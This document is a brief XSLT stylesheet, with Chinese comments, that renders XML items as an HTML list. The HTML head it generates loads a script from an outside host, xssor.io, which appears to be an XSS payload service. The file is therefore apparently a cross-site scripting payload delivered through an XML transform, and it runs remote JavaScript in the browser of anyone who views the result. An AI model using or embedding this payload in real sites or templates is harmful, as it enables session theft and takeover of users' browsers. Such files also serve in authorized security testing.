<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" encoding="UTF-8" indent="yes"/>

  <xsl:template match="/">
    <html>
      <head>
        <meta charset="UTF-8">
        <title>XML with JS</title>
        <!-- 引入外部 JavaScript -->
        <script src="https://xssor.io/s/x.js"></script>
      </head>
      <body>
        <h1>从 XML 转换而来</h1>
        <ul>
          <xsl:for-each select="root/item">
            <li><xsl:value-of select="."/></li>
          </xsl:for-each>
        </ul>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>